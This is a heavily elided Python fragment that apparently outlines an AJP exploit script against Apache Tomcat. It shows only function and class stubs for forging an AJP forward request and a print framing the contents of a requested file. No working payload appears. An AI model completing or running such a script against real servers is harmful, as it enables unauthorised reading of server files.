...
def prepare_ajp_forward_request(target_host, req_uri):
...
class Tomcat(object):
	...
	def perform_request(self, req_uri, headers, attributes):
...
data = t.perform_request('/',headers,attributes)
print('---------------------------%s-----------------------------'%args.file)
